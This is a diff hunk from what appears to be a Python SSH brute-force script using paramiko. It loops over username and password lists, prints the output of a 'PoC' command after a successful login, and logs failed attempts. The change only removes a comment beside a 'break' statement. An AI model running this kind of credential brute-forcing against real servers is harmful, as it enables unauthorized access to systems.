@@ -220,7 +220,7 @@ with open(username_file, "r") as users, open(password_file, "r") as passwords:
                 print("PoC:", stdout.read().decode())
 
                 client.close()
-                break  # optional: remove if you want to find all valid credentials
+                break  
 
             except paramiko.AuthenticationException:
                 print(f"[-] Failed: {username}:{password}")
